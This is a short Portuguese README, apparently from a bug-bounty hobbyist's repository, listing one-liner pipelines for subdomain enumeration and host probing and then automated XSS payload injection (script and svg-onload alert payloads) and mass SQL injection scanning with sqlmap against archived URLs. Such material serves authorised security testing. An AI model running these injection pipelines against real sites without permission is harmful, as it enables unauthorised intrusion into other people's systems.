# Liners_bounty
UMA SÉRIE DE ONELINERS PARA BUG BOUNTY

[Blog do Eike](https://ei7hacker.blogspot.com/)

[HTTPX](https://github.com/projectdiscovery/httpx)

[SUBFINDER](https://github.com/projectdiscovery/subfinder)

[HTTPROBE](https://github.com/tomnomnom/httprobe)

[ASSETFINDER](https://github.com/tomnomnom/assetfinder)

[ANEW](https://github.com/tomnomnom/anew)

[waybackurls](https://github.com/tomnomnom/waybackurls)

[FREQ](https://github.com/takshal/freq)

[AIRIXSS](https://github.com/ferreiraklet/airixss)
[GF](https://github.com/tomnomnom/gf)

### subdominios
```bash
 subfinder -d yahoo.com -o domains ; echo "yahoo.com" | assetfinder | tee -a domains ; wait ; cat domains | anew subs
```
### hosts 
```bash
subfinder -d hackerone.com | httpx  -o hosts

echo "hackerone.com" | assetfinder | httprobe | tee -a hosts

```
### status-code 
```bash
subfinder-d yahoo.com | httpx -status-code

subfinder-d yahoo.com | httpx -status-code -mc 200

subfinder-d yahoo.com | httpx -status-code -mc 300
```
### FIND XSS WITH FREQ AND QSREPLACE

```bash
echo "exemplo.com" | waybackurls | grep "=" | qsreplace "<script>alert(1)</script>" | freq 
```
### FIND WITH AIRIXSS

```bash
echo "exemplo.com" | waybackurls | gf xss | qsreplace "<svg onload=alert(1)>" | Airixss -payload "alert(1)" | egrep -v "Not"
```
###  FIND MASSIVE SQLI
```bash
waybackurls http://testphp.vulnweb.com | gf sqli | tee -a sqli.txt ; wait ; sqlmap -m sqli.txt --batch --random-agent --level 1
```
